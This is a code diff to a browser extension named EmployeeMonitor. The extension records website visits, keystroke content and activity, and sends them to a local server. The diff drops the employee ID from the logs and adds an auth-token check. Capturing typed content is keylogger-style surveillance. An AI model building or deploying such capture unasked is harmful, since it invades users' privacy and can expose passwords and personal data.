@@ -2,15 +2,10 @@
 class EmployeeMonitor {
   constructor() {
     this.serverUrl = 'http://localhost:8001/api';
-    this.employeeId = null;
     this.init();
   }
 
   async init() {
-    // Dapatkan ID karyawan dari storage
-    const result = await chrome.storage.local.get(['employeeId']);
-    this.employeeId = result.employeeId || 'unknown';
-    
     // Setup listeners
     this.setupListeners();
   }
@@ -40,7 +35,6 @@ class EmployeeMonitor {
 
   async logWebsiteVisit(url, title) {
     const data = {
-      employeeId: this.employeeId,
       type: 'website_visit',
       url: url,
       title: title,
@@ -54,7 +48,6 @@ class EmployeeMonitor {
 
   async logKeystrokes(keyData, url) {
     const data = {
-      employeeId: this.employeeId,
       type: 'keystroke',
       content: keyData.content,
       url: url,
@@ -67,7 +60,6 @@ class EmployeeMonitor {
 
   async logActivity(activityData, url) {
     const data = {
-      employeeId: this.employeeId,
       type: 'activity',
       activity: activityData,
       url: url,
@@ -80,11 +72,17 @@ class EmployeeMonitor {
 
   async sendToServer(data) {
     try {
+      const token = await this.getAuthToken();
+      if (!token) {
+        console.error('No auth token available');
+        return;
+      }
+
       await fetch(`${this.serverUrl}/log`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
-          'Authorization': `Bearer ${await this.getAuthToken()}`
+          'Authorization': `Bearer ${token}`
         },
         body: JSON.stringify(data)
       });
